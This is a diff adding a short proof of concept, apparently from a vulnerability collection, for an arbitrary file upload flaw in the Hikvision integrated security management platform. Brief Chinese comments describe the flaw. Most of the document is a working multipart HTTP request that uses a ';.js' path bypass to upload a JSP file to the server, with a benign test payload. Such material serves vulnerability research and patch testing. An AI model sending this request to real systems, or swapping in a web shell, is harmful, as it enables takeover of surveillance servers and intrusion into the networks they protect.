@@ -1,0 +1,21 @@
+# HIKVISION综合安防管理平台clusters文件上传漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 综合安防管理平台 /clusterMgr/clusters/ssl/file接口存在任意文件上传漏洞，攻击者通过构造特殊的请求包可以上传任意文件，获取服务器权限。
+POST /clusterMgr/clusters/ssl/file;.js?acid=80051731&bid=hd_tag_m8mv264z HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv264z
+RM-PRO-Token: ce1272c8bae24adc30490d7eb4dd4957
+RM-PRO-Time: 1742808546731
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=--------------------------984514492333278399715408
+
+----------------------------984514492333278399715408
+Content-Disposition: form-data; name="file"; filename="languages/default.jsp"
+Content-Type: image/png
+
+<%out.print("test");%>
+----------------------------984514492333278399715408
+Content-Disposition: form-data; name="proxyAddress"
+
+8.8.8.8
+----------------------------984514492333278399715408--
